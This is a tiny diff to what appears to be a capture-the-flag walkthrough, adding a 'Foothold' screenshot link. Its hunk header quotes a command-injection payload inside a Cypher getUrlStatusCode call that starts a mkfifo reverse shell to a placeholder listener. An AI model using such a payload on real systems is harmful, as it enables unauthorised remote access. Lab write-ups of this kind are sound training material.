@@ -57,5 +57,6 @@ CALL custom.getUrlStatusCode("http://<ip>:<port>/?c=$(rm%20%2Ftmp%2Ff%3Bmkfifo%2
 
 3. Check your listener for response.
 
+![Foothold](img/foothold.png)
    
 
